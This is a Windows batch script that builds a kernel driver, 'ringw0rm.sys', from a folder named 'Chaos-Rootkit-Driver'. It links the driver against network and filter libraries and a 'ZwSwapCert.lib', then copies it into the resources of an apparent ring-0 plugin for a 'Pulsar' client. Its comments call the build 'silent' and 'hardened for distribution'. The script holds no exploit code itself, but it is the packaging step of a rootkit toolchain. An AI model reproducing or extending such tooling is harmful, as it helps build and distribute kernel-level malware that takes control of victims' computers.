@echo off
REM ============================================================
REM RINGW0RM Driver Build - RELEASE Mode
REM Silent, stripped, hardened for distribution
REM ============================================================

setlocal enabledelayedexpansion

set "DRIVER_DIR=%~dp0Chaos-Rootkit-Driver"
set "OUTPUT_DIR=%DRIVER_DIR%\x64\Release"
set "OBJ_DIR=%DRIVER_DIR%\Chaos-Rootkit\x64\Release"
set "PLUGINS_DIR=%~dp0plugins"
set "CLIENT_RES=%~dp0Pulsar.Plugin.Ring0.Client\Resources"

REM Find Visual Studio
set "VSDEV="
if exist "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\Common7\Tools\VsDevCmd.bat" (
    set "VSDEV=C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\Common7\Tools\VsDevCmd.bat"
) else if exist "C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\Tools\VsDevCmd.bat" (
    set "VSDEV=C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\Tools\VsDevCmd.bat"
) else if exist "C:\Program Files\Microsoft Visual Studio\2022\Professional\Common7\Tools\VsDevCmd.bat" (
    set "VSDEV=C:\Program Files\Microsoft Visual Studio\2022\Professional\Common7\Tools\VsDevCmd.bat"
)

if "%VSDEV%"=="" (
    echo ERROR: Visual Studio 2022 not found!
    exit /b 1
)

call "%VSDEV%" -arch=amd64 >nul 2>&1

set "WDK_ROOT=C:\Program Files (x86)\Windows Kits\10"
for /f "delims=" %%i in ('dir /b /ad "%WDK_ROOT%\Include" 2^>nul ^| findstr /r "^10\.0\."') do set "WDK_VER=%%i"

if not exist "%OUTPUT_DIR%" mkdir "%OUTPUT_DIR%"
if not exist "%OBJ_DIR%" mkdir "%OBJ_DIR%"

cd /d "%DRIVER_DIR%"

REM RELEASE BUILD - optimized, no debug, hardened
cl.exe /c /nologo /W1 /WX- /O2 /Ob2 /Gm- /GS /fp:precise /Zc:wchar_t /Zc:forScope /Zc:inline ^
    /I"%WDK_ROOT%\Include\%WDK_VER%\km" ^
    /I"%WDK_ROOT%\Include\%WDK_VER%\km\crt" ^
    /I"%WDK_ROOT%\Include\%WDK_VER%\shared" ^
    /I"%WDK_ROOT%\Include\wdf\kmdf\1.33" ^
    /DNDEBUG /D_AMD64_ /DAMD64 /DNTDDI_VERSION=0x0A00000B /D_WIN32_WINNT=0x0A00 /DWINVER=0x0A00 /DWINNT=1 /DPOOL_NX_OPTIN=1 ^
    /Fo"%OBJ_DIR%\Driver.obj" ^
    /TC Driver.c
if errorlevel 1 exit /b 1

cl.exe /c /nologo /W1 /WX- /O2 /Ob2 /Gm- /GS /fp:precise /Zc:wchar_t /Zc:forScope /Zc:inline ^
    /I"%WDK_ROOT%\Include\%WDK_VER%\km" ^
    /I"%WDK_ROOT%\Include\%WDK_VER%\km\crt" ^
    /I"%WDK_ROOT%\Include\%WDK_VER%\shared" ^
    /I"%WDK_ROOT%\Include\wdf\kmdf\1.33" ^
    /DNDEBUG /D_AMD64_ /DAMD64 /DNTDDI_VERSION=0x0A00000B /D_WIN32_WINNT=0x0A00 /DWINVER=0x0A00 /DWINNT=1 /DPOOL_NX_OPTIN=1 ^
    /Fo"%OBJ_DIR%\utils.obj" ^
    /TC utils.c
if errorlevel 1 exit /b 1

REM Link with hardening flags
link.exe /NOLOGO /DRIVER /ENTRY:DriverEntry /SUBSYSTEM:NATIVE /NODEFAULTLIB ^
    /RELEASE ^
    /DYNAMICBASE ^
    /HIGHENTROPYVA ^
    /NXCOMPAT ^
    /OUT:"%OUTPUT_DIR%\ringw0rm.sys" ^
    /LIBPATH:"%WDK_ROOT%\lib\%WDK_VER%\km\x64" ^
    /LIBPATH:"%WDK_ROOT%\lib\wdf\kmdf\x64\1.33" ^
    ntoskrnl.lib wdfldr.lib wdfdriverentry.lib bufferoverflowfastfailk.lib fltmgr.lib fwpkclnt.lib netio.lib ndis.lib ^
    ZwSwapCert.lib ^
    "%OBJ_DIR%\Driver.obj" "%OBJ_DIR%\utils.obj"
if errorlevel 1 exit /b 1

REM Copy to required locations
copy /Y "%OUTPUT_DIR%\ringw0rm.sys" "%CLIENT_RES%\ringw0rm.sys" >nul
copy /Y "%OUTPUT_DIR%\ringw0rm.sys" "%PLUGINS_DIR%\ringw0rm.sys" >nul

echo    Driver built (RELEASE mode - silent, hardened)
endlocal
